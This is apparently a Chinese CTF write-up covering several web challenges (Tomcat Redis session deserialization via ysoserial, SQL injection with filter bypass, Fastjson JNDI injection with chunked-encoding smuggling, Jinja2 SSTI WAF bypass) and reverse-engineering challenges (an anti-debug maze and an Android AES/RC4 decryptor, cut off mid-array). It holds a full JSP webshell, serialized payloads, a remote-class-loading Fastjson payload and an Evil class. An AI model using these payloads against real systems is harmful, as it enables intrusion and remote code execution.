# WEB
## 题目：<font style="color:rgb(33, 37, 41);">ErloGrave</font>
解题步骤

### 一
尝试登陆失败

![image-1730940336885](./assets/image-1730940336885.png)

查看代码，发现登录没有数据库，写死在代码里了：

![image-1730940337460](./assets/image-1730940337460.png)

COPY 下来登录提示登录成功：

![image-1730940338013](./assets/image-1730940338013.png)

源代码中发现登录之后会把登录信息缓存到 redis 中，且使用 base64 编码，即可以把任意二进制数据污染进去。

### 二
审计代码发现题目跑在 Tomcat 里，加之题目比较简单，想到 Tomcat -Session 反序列化。

查看相关配置，发现题目的 Session 使用的是 [tomcat-cluster-redis-session-manager](https://github.com/ran-jit/tomcat-cluster-redis-session-manager) 这个依赖。

直接看源码是如何处理Session的，最终定位到：

![image-1730940338558](./assets/image-1730940338558.png)

会把从 Redis 中读出来的 Session 反序列化。

结合 tomcat session 的机制，得出可以将 payload 传入 Redis ，然后改到 JSESSION 。

检查依赖，发现 lib 里面有一个低版本 commons collections：  
![image-1730940339193](./assets/image-1730940339193.png)

### 三
这个镜像的 jre 版本很高很高，只有 CC 的版本低，选用 CC6。

能 RCE 就比较自由了。可以直接弹 shell 也可以写 webshell。

jsp webshell for antsword:

```plain
<%!
    class U extends ClassLoader {
        U(ClassLoader c) {
            super(c);
        }
        public Class g(byte[] b) {
            return super.defineClass(b, 0, b.length);
        }
    }

    public byte[] base64Decode(String str) throws Exception {
        try {
            Class clazz = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) clazz.getMethod("decodeBuffer", String.class).invoke(clazz.newInstance(), str);
        } catch (Exception e) {
            Class clazz = Class.forName("java.util.Base64");
            Object decoder = clazz.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, str);
        }
    }
%>
<%
    String cls = request.getParameter("Qst");
    if (cls != null) {
        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);
    }
%>
```

空白符太多了 base64 一下，构造命令：

```bash
echo 'PCUhCiAgICBjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXIgewogICAgICAgIFUoQ2xhc3NMb2FkZXIgYykgewogICAgICAgICAgICBzdXBlcihjKTsKICAgICAgICB9CiAgICAgICAgcHVibGljIENsYXNzIGcoYnl0ZVtdIGIpIHsKICAgICAgICAgICAgcmV0dXJuIHN1cGVyLmRlZmluZUNsYXNzKGIsIDAsIGIubGVuZ3RoKTsKICAgICAgICB9CiAgICB9CgogICAgcHVibGljIGJ5dGVbXSBiYXNlNjREZWNvZGUoU3RyaW5nIHN0cikgdGhyb3dzIEV4Y2VwdGlvbiB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgQ2xhc3MgY2xhenogPSBDbGFzcy5mb3JOYW1lKCJzdW4ubWlzYy5CQVNFNjREZWNvZGVyIik7CiAgICAgICAgICAgIHJldHVybiAoYnl0ZVtdKSBjbGF6ei5nZXRNZXRob2QoImRlY29kZUJ1ZmZlciIsIFN0cmluZy5jbGFzcykuaW52b2tlKGNsYXp6Lm5ld0luc3RhbmNlKCksIHN0cik7CiAgICAgICAgfSBjYXRjaCAoRXhjZXB0aW9uIGUpIHsKICAgICAgICAgICAgQ2xhc3MgY2xhenogPSBDbGFzcy5mb3JOYW1lKCJqYXZhLnV0aWwuQmFzZTY0Iik7CiAgICAgICAgICAgIE9iamVjdCBkZWNvZGVyID0gY2xhenouZ2V0TWV0aG9kKCJnZXREZWNvZGVyIikuaW52b2tlKG51bGwpOwogICAgICAgICAgICByZXR1cm4gKGJ5dGVbXSkgZGVjb2Rlci5nZXRDbGFzcygpLmdldE1ldGhvZCgiZGVjb2RlIiwgU3RyaW5nLmNsYXNzKS5pbnZva2UoZGVjb2Rlciwgc3RyKTsKICAgICAgICB9CiAgICB9CiU+CjwlCiAgICBTdHJpbmcgY2xzID0gcmVxdWVzdC5nZXRQYXJhbWV0ZXIoIlFzdCIpOwogICAgaWYgKGNscyAhPSBudWxsKSB7CiAgICAgICAgbmV3IFUodGhpcy5nZXRDbGFzcygpLmdldENsYXNzTG9hZGVyKCkpLmcoYmFzZTY0RGVjb2RlKGNscykpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTsKICAgIH0KJT4=' | base64 -d > /usr/local/tomcat/webapps/ROOT/shell.jsp
```

再 base64 一层适应 ysoserial ：

```bash
"bash -c {echo,ZWNobyAnUENVaENpQWdJQ0JqYkdGemN5QlZJR1Y0ZEdWdVpITWdRMnhoYzNOTWIyRmtaWElnZXdvZ0lDQWdJQ0FnSUZVb1EyeGhjM05NYjJGa1pYSWdZeWtnZXdvZ0lDQWdJQ0FnSUNBZ0lDQnpkWEJsY2loaktUc0tJQ0FnSUNBZ0lDQjlDaUFnSUNBZ0lDQWdjSFZpYkdsaklFTnNZWE56SUdjb1lubDBaVnRkSUdJcElIc0tJQ0FnSUNBZ0lDQWdJQ0FnY21WMGRYSnVJSE4xY0dWeUxtUmxabWx1WlVOc1lYTnpLR0lzSURBc0lHSXViR1Z1WjNSb0tUc0tJQ0FnSUNBZ0lDQjlDaUFnSUNCOUNnb2dJQ0FnY0hWaWJHbGpJR0o1ZEdWYlhTQmlZWE5sTmpSRVpXTnZaR1VvVTNSeWFXNW5JSE4wY2lrZ2RHaHliM2R6SUVWNFkyVndkR2x2YmlCN0NpQWdJQ0FnSUNBZ2RISjVJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1EyeGhjM01nWTJ4aGVub2dQU0JEYkdGemN5NW1iM0pPWVcxbEtDSnpkVzR1Yldsell5NUNRVk5GTmpSRVpXTnZaR1Z5SWlrN0NpQWdJQ0FnSUNBZ0lDQWdJSEpsZEhWeWJpQW9ZbmwwWlZ0ZEtTQmpiR0Y2ZWk1blpYUk5aWFJvYjJRb0ltUmxZMjlrWlVKMVptWmxjaUlzSUZOMGNtbHVaeTVqYkdGemN5a3VhVzUyYjJ0bEtHTnNZWHA2TG01bGQwbHVjM1JoYm1ObEtDa3NJSE4wY2lrN0NpQWdJQ0FnSUNBZ2ZTQmpZWFJqYUNBb1JYaGpaWEIwYVc5dUlHVXBJSHNLSUNBZ0lDQWdJQ0FnSUNBZ1EyeGhjM01nWTJ4aGVub2dQU0JEYkdGemN5NW1iM0pPWVcxbEtDSnFZWFpoTG5WMGFXd3VRbUZ6WlRZMElpazdDaUFnSUNBZ0lDQWdJQ0FnSUU5aWFtVmpkQ0JrWldOdlpHVnlJRDBnWTJ4aGVub3VaMlYwVFdWMGFHOWtLQ0puWlhSRVpXTnZaR1Z5SWlrdWFXNTJiMnRsS0c1MWJHd3BPd29nSUNBZ0lDQWdJQ0FnSUNCeVpYUjFjbTRnS0dKNWRHVmJYU2tnWkdWamIyUmxjaTVuWlhSRGJHRnpjeWdwTG1kbGRFMWxkR2h2WkNnaVpHVmpiMlJsSWl3Z1UzUnlhVzVuTG1Oc1lYTnpLUzVwYm5admEyVW9aR1ZqYjJSbGNpd2djM1J5S1RzS0lDQWdJQ0FnSUNCOUNpQWdJQ0I5Q2lVK0Nqd2xDaUFnSUNCVGRISnBibWNnWTJ4eklEMGdjbVZ4ZFdWemRDNW5aWFJRWVhKaGJXVjBaWElvSWxGemRDSXBPd29nSUNBZ2FXWWdLR05zY3lBaFBTQnVkV3hzS1NCN0NpQWdJQ0FnSUNBZ2JtVjNJRlVvZEdocGN5NW5aWFJEYkdGemN5Z3BMbWRsZEVOc1lYTnpURzloWkdWeUtDa3BMbWNvWW1GelpUWTBSR1ZqYjJSbEtHTnNjeWtwTG01bGQwbHVjM1JoYm1ObEtDa3VaWEYxWVd4ektIQmhaMlZEYjI1MFpYaDBLVHNLSUNBZ0lIMEtKVDQ9JyB8IGJhc2U2NCAtZCA+IC91c3IvbG9jYWwvdG9tY2F0L3dlYmFwcHMvUk9PVC9zaGVsbC5qc3A=}|{base64,-d}|{bash,-i}"
```

一把梭：

```bash
java -jar ysoserial.jar CommonsCollections6 [上面的cmd] > erlo-payload.ser 
```

base64，生成最终 payload：

```python
import base64
path = "D:\\CTF\\tools\\ysoserial\\erlo-payload.ser"
with open (path, 'rb') as f:
    file_content = f.read()
print(base64.b64encode(file_content).decode())
```

```plain
rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0BuliYXNoIC1jIHtlY2hvLFpXTm9ieUFuVUVOVmFFTnBRV2RKUTBKcVlrZEdlbU41UWxaSlIxWTBaRWRXZFZwSVRXZFJNbmhvWXpOT1RXSXlSbXRhV0VsblpYZHZaMGxEUVdkSlEwRm5TVVpWYjFFeWVHaGpNMDVOWWpKR2ExcFlTV2RaZVd0blpYZHZaMGxEUVdkSlEwRm5TVU5CWjBsRFFucGtXRUpzWTJsb2FrdFVjMHRKUTBGblNVTkJaMGxEUWpsRGFVRm5TVU5CWjBsRFFXZGpTRlpwWWtkc2FrbEZUbk5aV0U1NlNVZGpiMWx1YkRCYVZuUmtTVWRKY0VsSWMwdEpRMEZuU1VOQlowbERRV2RKUTBGblkyMVdNR1JZU25WSlNFNHhZMGRXZVV4dFVteGFiV3gxV2xWT2MxbFlUbnBMUjBselNVUkJjMGxIU1hWaVIxWjFXak5TYjB0VWMwdEpRMEZuU1VOQlowbERRamxEYVVGblNVTkNPVU5uYjJkSlEwRm5ZMGhXYVdKSGJHcEpSMG8xWkVkV1lsaFRRbWxaV0U1c1RtcFNSVnBYVG5aYVIxVnZWVE5TZVdGWE5XNUpTRTR3WTJscloyUkhhSGxpTTJSNlNVVldORmt5Vm5ka1IyeDJZbWxDTjBOcFFXZEpRMEZuU1VOQloyUklTalZKU0hOTFNVTkJaMGxEUVdkSlEwRm5TVU5CWjFFeWVHaGpNMDFuV1RKNGFHVnViMmRRVTBKRVlrZEdlbU41TlcxaU0wcFBXVmN4YkV0RFNucGtWelIxWWxkc2VsbDVOVU5SVms1R1RtcFNSVnBYVG5aYVIxWjVTV2xyTjBOcFFXZEpRMEZuU1VOQlowbERRV2RKU0Vwc1pFaFdlV0pwUVc5WmJtd3dXbFowWkV0VFFtcGlSMFkyWldrMWJscFlVazVhV0ZKdllqSlJiMGx0VW14Wk1qbHJXbFZLTVZwdFdteGphVWx6U1VaT01HTnRiSFZhZVRWcVlrZEdlbU41YTNWaFZ6VXlZakowYkV0SFRuTlpXSEEyVEcwMWJHUXdiSFZqTTFKb1ltMU9iRXREYTNOSlNFNHdZMmxyTjBOcFFXZEpRMEZuU1VOQloyWlRRbXBaV0ZKcVlVTkJiMUpZYUdwYVdFSXdZVmM1ZFVsSFZYQkpTSE5MU1VOQlowbERRV2RKUTBGblNVTkJaMUV5ZUdoak0wMW5XVEo0YUdWdWIyZFFVMEpFWWtkR2VtTjVOVzFpTTBwUFdWY3hiRXREU25GWldGcG9URzVXTUdGWGQzVlJiVVo2V2xSWk1FbHBhemREYVVGblNVTkJaMGxEUVdkSlEwRm5TVVU1YVdGdFZtcGtRMEpyV2xkT2RscEhWbmxKUkRCbldUSjRhR1Z1YjNWYU1sWXdWRmRXTUdGSE9XdExRMHB1V2xoU1JWcFhUblphUjFaNVNXbHJkV0ZYTlRKaU1uUnNTMGMxTVdKSGQzQlBkMjluU1VOQlowbERRV2RKUTBGblNVTkNlVnBZVWpGamJUUm5TMGRLTldSSFZtSllVMnRuV2tkV2FtSXlVbXhqYVRWdVdsaFNSR0pIUm5wamVXZHdURzFrYkdSRk1XeGtSMmgyV2tObmFWcEhWbXBpTWxKc1NXbDNaMVV6VW5saFZ6VnVURzFPYzFsWVRucExVelZ3WW01YWRtRXlWVzlhUjFacVlqSlNiR05wZDJkak0xSjVTMVJ6UzBsRFFXZEpRMEZuU1VOQ09VTnBRV2RKUTBJNVEybFZLME5xZDJ4RGFVRm5TVU5DVkdSSVNuQmliV05uV1RKNGVrbEVNR2RqYlZaNFpGZFdlbVJETlc1YVdGSlJXVmhLYUdKWFZqQmFXRWx2U1d4R2VtUkRTWEJQZDI5blNVTkJaMkZYV1dkTFIwNXpZM2xCYUZCVFFuVmtWM2h6UzFOQ04wTnBRV2RKUTBGblNVTkJaMkp0VmpOSlJsVnZaRWRvY0dONU5XNWFXRkpFWWtkR2VtTjVaM0JNYldSc1pFVk9jMWxZVG5wVVJ6bG9Xa2RXZVV0RGEzQk1iV052V1cxR2VscFVXVEJTUjFacVlqSlNiRXRIVG5OamVXdHdURzAxYkdRd2JIVmpNMUpvWW0xT2JFdERhM1ZhV0VZeFdWZDRla3RJUW1oYU1sWkVZakkxTUZwWWFEQkxWSE5MU1VOQlowbElNRXRLVkRROUp5QjhJR0poYzJVMk5DQXRaQ0ErSUM5MWMzSXZiRzlqWVd3dmRHOXRZMkYwTDNkbFltRndjSE12VWs5UFZDOXphR1ZzYkM1cWMzQT19fHtiYXNlNjQsLWR9fHtiYXNoLC1pfXQABGV4ZWN1cQB+ABsAAAABcQB+ACBzcQB+AA9zcgARamF2YS5sYW5nLkludGVnZXIS4qCk94GHOAIAAUkABXZhbHVleHIAEGphdmEubGFuZy5OdW1iZXKGrJUdC5TgiwIAAHhwAAAAAXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4
```

改包把反序列化数据当密码传上去：

![image-1730940339700](./assets/image-1730940339700.png)

登录失败，反序列化数据写入 redis 。

![image-1730940340735](./assets/image-1730940340735.png)

重发包改 JSESSION 为 `fail::hacker`触发反序列化：

![image-1730940341231](./assets/image-1730940341231.png)

`shell.jsp` 美美白屏：

![image-1730940341778](./assets/image-1730940341778.png)

蚁剑直连即可。根目录下面的 `/flag` 是假的，发现异常目录`etccc`，点进去就有真 `f.lag`。

![image-1730940342369](./assets/image-1730940342369.png)

![image-1730940343155](./assets/image-1730940343155.png)

VPS 过期了反弹 Shell 没试 XD ，应该也是可以的。

## 题目：<font style="color:rgb(33, 37, 41);">Monument</font>
解题步骤

**Mysql**

访问题目界面，查询框 要求输入id，很明显是有回显sql注入

稍微测试一下 还会回显notfound 和error  

```plain
1   
1#1    
11     
1-- 1
```

简单测试发现过滤# 而且是以替换为空过滤的

```plain
-1'uniOn seLect 1,2,3--
```

回显error 空格也被过滤  

payload：

```sql
-1'union/*/**/*/select/*/**/*/1,2,3,4--
//回显2 4 

-1'union/*/**/*/select/*/**/*/1,2,3,database()--
//表名user 

-1'union/*/**/*/select/*/**/*/1,2,3,group_concat(table_name)/*/**/*/from/*/**/*/information_schema.tables/*/**/*/where/*/**/*/table_schema/*/**/*/=/*/**/*/'user'--
//us???er,userinfo

-1'union/*/**/*/select/*/**/*/1,2,3,group_concat(column_name)/*/**/*/from/*/**/*/information_schema.columns/*/**/*/where/*/**/*/table_name='us???er'--
//id,username,content,info

-1'union/*/**/*/select/*/**/*/1,2,3,group_concat(id,username,content,info)/*/**/*/from/*/**/*/`us???er`--
这里us???er是一个表名，它包含特殊字符“?”用反引号包裹以确保解析正确处理标识符，而不将其误认为是其他符号或关键字的一部分

//1amdyesno,2intelnoyes,3Overclocked to 5GHz????50% of humans thank me,4Overclocked to 10GHz????100% of humans thank me,5ok????try to /ch4ng3us3r1nf0 page,6why????Lower versions
```

得到路由/ch4ng3us3r1nf0



### Fastjson
/ch4ng3us3r1nf0修改用户信息， 页面返回json对象，尝试post一个新的json对象去解析

![image-1730940343639](./assets/image-1730940343639.png)

发现会解析对象，而且把age修改为20

这里fastjson用的是比较低的版本

```json
{
    "b":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://ip:port/Evil",
        "autoCommit":true
    }
}
```

发送时发现限制长度content-type

无论怎么短链接或者缩短payload长度无法降低到限制长度以下

请求走私chunked编码绕过长度限制

[https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Transfer-Encoding)

;后面的内容是注释

```http
Content-Type: application/json
Transfer-Encoding: chunked

7;Ii

{
  
8;f
  "b":{

7;J

      
A;SUy
  "@type":
7;2y
"com.su
8;GF
n.rowset
7;Zry
.JdbcRo
5;AU
wSetI
6;1h
mpl",

6;X

     
7;EnV
   "dat
5;jLH
aSour
6;U
ceName
5;b
":"rm
8;izd
i://ip:p
7;B
ort/Evi
6;Fs
l",
 
7;a
       
7;eI
"autoCo
5;8Oj
mmit"
A;sY
:true
   
5;0
 }
}
2;tBN


0
```

vps开启rmi/ldap服务 加载恶意类反弹shell

```java
import java.lang.Runtime;
import java.lang.Process;
public class Evil{
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            String[] commands = {"/bin/bash","-c",""};
            Process pc = rt.exec(commands);
            pc.waitFor();
        } catch (Exception e) {
        }
    }
}
```

java8低版本编译成class 

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://ip:port/#Evil 9999
```



![image-1730940344247](./assets/image-1730940344247.png)

没有提权，直接拿flag

## 题目：<font style="color:rgb(33, 37, 41);">Truman</font>
解题步骤

1. 在输入框中输入任意字符串，输出Hello _输入字符串_ 加一句话，推测可能存在ssti注入

![image-1730940344829](./assets/image-1730940344829.png)

1. 输入{{7*'7'}}，在输出中看见7个7，判断存在jinja2模板的ssti注入。

![image-1730940345460](./assets/image-1730940345460.png)

1. 尝试利用

```plain
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat flag')|attr('read')()}}
```

注入，发现存在waf过滤。

![image-1730940345975](./assets/image-1730940345975.png)

1. waf提示存在非法标点与关键词，尝试利用set拼接，以上述payload为例，首先测试得到waf将下划线过滤，利用

```plain
{% set pop=dict(pop=a)|join %} 
{% set underline=(lipsum|string|list)|attr(pop)(18)%} 
```

构造得到下划线，测试后成功绕过waf  
![image-1730940346521](./assets/image-1730940346521.png)  
5.然后测试发现globals，getitem，os等关键词均被过滤，利用

```plain
{% set o=dict(o=b,s=a)|join %} 
{% set globa=(underline,underline,dict(glo=b,bals=a)|join,underline,underline)|join%}
{% set getite=(underline,underline,dict(get=b,item=a)|join,underline,underline)|join%}
{% set pope=dict(po=b,pen=a)|join%} 
{% set ca=dict(ca=b,t=a)|join%} 
{% set rea=dict(re=b,ad=a)|join%}  
```

拼接得到关键字，再利用

```plain
{% set space=(lipsum|string|list)|attr(pop)(9)%}
```

构造得到空格，这一步是为了后续拼接出命令

```plain
{% set cmd=(ca,space,dict(fl=b,ag=a)|join)|join%} 
```

最终得到的payload如下：

```plain
{% set pop=dict(pop=a)|join %} 
{% set o=dict(o=b,s=a)|join %} 
{% set underline=(lipsum|string|list)|attr(pop)(18)%} 
{% set globa=(underline,underline,dict(glo=b,bals=a)|join,underline,underline)|join%}
{% set getite=(underline,underline,dict(get=b,item=a)|join,underline,underline)|join%}
{% set space=(lipsum|string|list)|attr(pop)(9)%}
{% set pope=dict(po=b,pen=a)|join%} 
{% set ca=dict(ca=b,t=a)|join%} 
{% set cmd=(ca,space,dict(fl=b,ag=a)|join)|join%} 
{% set rea=dict(re=b,ad=a)|join%}  

{{lipsum|attr(globa)|attr(getite)(o)|attr(pope)(cmd)|attr(rea)()}}
```

成功绕过waf读到flag内容  
![image-1730940347027](./assets/image-1730940347027.png)



# REVERSE
## 题目：<font style="color:rgb(33, 37, 41);">Maze</font>
解题步骤

打开IDA之后看见如下代码，可以将名称修改一下：

![image-1730940347571](./assets/image-1730940347571.png)

其中v8记录了当前的位置，要使用`wasdun`六种指令破解由map索引的三维立体迷宫。迷宫中0为可移动地块，1为障碍物，且移动过程遵循“一头撞死”原则，即会向某一方向一直走直到撞到障碍物为止。

然而根据此时的信息解得路径为`sduwandus`，输入给程序后并不能得到程序的认可。

由此推测地图一定被修改过，在main第一行下断点试图动调，程序会直接崩溃。

寻找main之前的调用可以看见：

![image-1730940348040](./assets/image-1730940348040.png)

点进去可以看见：

![image-1730940348593](./assets/image-1730940348593.png)

其调用了sub_140001000和sub_140001020。其中sub_140001000调用了`ZwSetInformationThread`函数反调，sub_140001020创建了另一个线程检查硬件断点反调。

并且在函数栏可以看见：

![image-1730940349039](./assets/image-1730940349039.png)

发现程序使用了TLS回调函数，进到TLS里面可以看见：

![image-1730940349512](./assets/image-1730940349512.png)

其对在main之前调用的一个函数进行了修改。将反动调的部分全部改成nop后再次动调查看次函数可以找到：

![image-1730940349972](./assets/image-1730940349972.png)

其中ii是main函数中的循环变量，iii初值为0。iii在不停地检测ii是否变化，发生变化后control会在1和2之间切换，同时根据control的值使得`map2[-8]`的值在map1和map2中切换。而此时IDA将map2识别成了long long类型，`map2[-8]`恰好指向main函数中使用的变量map。即该迷宫的地图会在map1和map2间切换。

而main函数中没移动一步便会Sleep(40)，这段时间足够次线程跑完一遍循环，切换地图。

提取出两张地图开走：

```plain
*0000000 00000000
*0000010 00000000
*00000*0 000000*0
*00000*0 00000000
*00000*0 00000000
*00000*0 00000000
*00000*1 *******1
10000000 00000000

00000000 00000000
01000000 00000000
00000000 000000*0
00000000 00000000
01000000 00000000
00000000 00000000
00000000 00000000
00000000 00000000

00000000 00000000
00000100 00000000
00000000 010000*0
0******1 0*0000*0
0*000000 0*000000
00000000 00000000
00000000 00000000
00000000 00000000

00000000 00000000
00000000 00000000
00000000 000000*0
00000000 000000*0
0*000000 00000000
00000000 00000000
00000000 00000000
00000000 00000000

00000000 00001000
0000*000 0000*000
00000000 0000*0*0
0001***0 0000*0*0
0*000000 00000000
00000000 00000000
00000000 00000000
00000000 00000000

00000010 00000000
1000*000 00000000
00000000 000000*0
00000000 00000010
0*000000 00000000
00000000 00000000
00000000 00000000
00000000 00000000

00000000 00000000
0000*000 0000*000
000000*0 0000*0*0
000000*0 0000*000
0*0000*0 1******0
00000010 0000*000
0000#010 0000#000
00001000 00001000

00000000 00000000
00001000 00000000
00000000 00000010
00000000 00000000
00000000 00000000
00000000 00000000
00000000 00000000
00000000 00000000
```

其中*代表了正确的道路，即`sdwusanwduawus`，输入给程序，根据成功的提示，其32位小写md5值就是flag。

解得：`DASCTF{1bb5fd78f2299f26ccc0630c5e7516b6}`



## 题目：<font style="color:rgb(33, 37, 41);">Tuner</font>
解题步骤

安卓逆向，JAVA层分析：

接收一个flag string以及一个`arraylist`，这个`arraylist`是由接收到的音频计算MIDI notes的方式得来的，`YINCalculator` 类就是计算音频频率的，可以看到音频的频率需要在 385hz 到 530hz 之间 

![image-1730940350482](./assets/image-1730940350482.png)

然后进入频率转化成 MIDI 音高的算法，可以发现最后转化成的MIDI音高只有6个整数值 67, 68, 69, 70, 71, 72

![image-1730940350933](./assets/image-1730940350933.png)

而且该 `arraylist` 限定了长度是 6，接收完以后进入 `nativeProcessMidiNotes` 函数

![image-1730940351284](./assets/image-1730940351284.png)

SO层分析：

显示把输入的 `arraylist` 异或 0x23得到 rc4 密钥

![image-1730940351709](./assets/image-1730940351709.png)

然后进 AES，AES魔改了密钥扩展，字节代换以及列混淆

![image-1730940352046](./assets/image-1730940352046.png)![image-1730940352391](./assets/image-1730940352391.png)![image-1730940352752](./assets/image-1730940352752.png)

最后是 RC4，密钥由于是6位且每位只有6种，直接爆破。

解密脚本如下

```cpp
/****************************************************************************************************************/
void inv_shift_rows(AES_CYPHER_T mode, uint8_t *state)
{
    uint8_t *s = (uint8_t *)state;
    int i, j, r;
    
    for (i = 1; i < g_aes_nb[mode]; i++) {
        for (j = 0; j < g_aes_nb[mode] - i; j++) {
            uint8_t tmp = s[i];
            for (r = 0; r < g_aes_nb[mode]; r++) {
                s[i + r * 4] = s[i + (r + 1) * 4];
            }
            s[i + (g_aes_nb[mode] - 1) * 4] = tmp;
        }
    }
}
/****************************************************************************************************************/
uint8_t inv_sub_sbox(uint8_t val)
{
    return g_inv_sbox[val];
}
/****************************************************************************************************************/
void inv_sub_bytes(AES_CYPHER_T mode, uint8_t *state)
{
    int i, j;
    
    for (i = 0; i < g_aes_nb[mode]; i++) {
        for (j = 0; j < 4; j++) {
            state[i * 4 + j] = inv_sub_sbox(state[i * 4 + j] ^ 0x27);
//			printf("**************inv-sub-bytes****************\n");
        }
    }
}
/****************************************************************************************************************/
void inv_mix_columns(AES_CYPHER_T mode, uint8_t *state)
{
    uint8_t y[16] = { 0x0e, 0x0b, 0x0d, 0x09,  0x09, 0x0e, 0x0b, 0x0d,
        0x0d, 0x09, 0x0e, 0x0b,  0x0b, 0x0d, 0x09, 0x0e };
    uint8_t s[4];
    int i, j, r;
    
    for (i = 0; i < g_aes_nb[mode]; i++) {
        for (r = 0; r < 4; r++) {
            s[r] = 0;
            for (j = 0; j < 4; j++) {
                s[r] = s[r] ^ aes_mul(state[i * 4 + j] ^ 0x47, y[r * 4 + j]);
            }
        }
        for (r = 0; r < 4; r++) {
            state[i * 4 + r] = s[r];
        }
    }
}
/****************************************************************************************************************/
int aes_decrypt_cbc(AES_CYPHER_T mode, uint8_t *data, int len, uint8_t *key, uint8_t *iv)
{
    uint8_t w[4 * 4 * 15] = {0x97, 0x57, 0x7c, 0xdc, 0xdb, 0xe2, 0xc, 0x32, 0x20, 0xfc, 0x59, 0xca, 0xa6, 0x40, 0xb5, 0x90, 0x9b, 0x82, 0x1c, 0xf8, 0x45, 0x60, 0x10, 0xca, 0x63, 0x9c, 0x49, 0x0, 0xc2, 0xdc, 0xfc, 0x90, 0x17, 0x32, 0x7c, 0xdd, 0x5b, 0x52, 0x6c, 0x17, 0x32, 0xce, 0x25, 0x17, 0xfb, 0x12, 0xd9, 0x87, 0xd6, 0x7, 0x6b, 0xd2, 0x80, 0x55, 0x7, 0xc5, 0xbc, 0x9b, 0x22, 0xd2, 0x48, 0x89, 0xfb, 0x55, 0x69, 0x8, 0x97, 0x80, 0xf8, 0x5d, 0x90, 0x45, 0x56, 0xc6, 0xb2, 0x97, 0xd, 0x4f, 0x49, 0xc2, 0xe9, 0x33, 0xb2, 0x57, 0x4, 0x6e, 0x22, 0x12, 0x44, 0xa8, 0x90, 0x85, 0x5e, 0xe7, 0xd9, 0x47, 0x45, 0x6, 0x12, 0xf, 0x58, 0x68, 0x30, 0x1d, 0x6, 0xc0, 0xa0, 0x98, 0x43, 0x27, 0x79, 0xdf, 0xd5, 0xb0, 0x8c, 0x15, 0x90, 0xd8, 0xbc, 0x8, 0x88, 0x18, 0x1c, 0x90, 0xd4, 0x3f, 0x65, 0x4f, 0x0, 0xfd, 0x8, 0x5d, 0xb1, 0x25, 0xb4, 0x55, 0x1b, 0x3d, 0xa8, 0xc5, 0xec, 0x2, 0xcd, 0x8a, 0x48, 0x40, 0x76, 0x93, 0xdc, 0x65, 0xc2, 0xc6, 0xe1, 0x58, 0x6a, 0x3, 0x2a, 0x5a, 0xa7, 0x89, 0xe8, 0x1c, 0xd1, 0x76, 0x1d, 0x79, 0x13, 0xb0, 0xd6, 0x21, 0x79, 0xb3, 0xd7, 0x7b, 0xde, 0x3a, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 